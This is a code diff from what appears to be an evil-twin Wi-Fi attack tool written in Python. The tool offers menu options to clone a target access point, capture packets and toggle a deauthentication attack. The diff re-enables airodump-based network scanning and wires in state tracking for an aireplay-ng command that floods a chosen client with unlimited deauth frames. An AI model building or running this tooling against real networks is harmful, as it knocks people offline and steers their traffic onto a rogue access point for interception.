@@ -35,6 +35,10 @@ def displayMenu():
 		print("Capture Packets : ", '\x1b[0;37;41m' + settings.globals["capture"] + '\x1b[0m', "\n")
 	else:
 		print("Capture Packets : ", '\x1b[6;30;42m' + settings.globals["capture"] + '\x1b[0m', "\n")	
+	if settings.globals["deauth"] == 'OFF':
+		print("Deauthentification Attack : ", '\x1b[0;37;41m' + settings.globals["deauth"] + '\x1b[0m', "\n")
+	else:
+		print("Deauthentification Attack : ", '\x1b[6;30;42m' + settings.globals["deauth"] + '\x1b[0m', "\n")
 	options = ["Select Interfaces", "Select WIFI target to clone", "Lauch TwinEvil", "Deauthentification Setup", "Start/Stop Packets capture", "Start/Stop Deauthentification Attack", "Exit"]
 	terminal_menu = TerminalMenu(options)
 	menu_entry_index = terminal_menu.show()
@@ -157,7 +161,7 @@ def displaySelectTargetType():
 			return
 
 def automaticSelectTarget():
-	#airoScan(settings.globals["interfaceAP"])
+	airoScan(settings.globals["interfaceAP"])
 	aps = getAps()
 	print_array(aps["aps"])
 
@@ -171,7 +175,7 @@ def automaticSelectTarget():
 	settings.globals["channel"] = max[3].lstrip()
 
 def displaySelectTarget():
-	#airoScan(settings.globals["interfaceAP"])
+	airoScan(settings.globals["interfaceAP"])
 	aps = getAps()
 	options = tabulate(aps["aps"], headers=aps["header"])
 	headers = options.split("\n")[0:2]
@@ -199,7 +203,10 @@ def capturePackets(wlan):
 		shell("pkill tcpdump")
 
 def deauthAttack(wlan, bssid, deviceMAC):
-	if settings.globals["deviceMAC"] is not None:
+	if settings.globals["deviceMAC"] is not None and settings.globals["deauth"] == 'OFF':
 		call(["gnome-terminal", "-x", "sh", "-c", "aireplay-ng -0 0 -a " + bssid + "  -c " + deviceMAC + ' ' + wlan + "; bash"])
+		settings.globals["deauth"] = 'ON'
 	else:
 		shell("pkill airodump")
+		settings.globals["deauth"] = 'OFF'
+
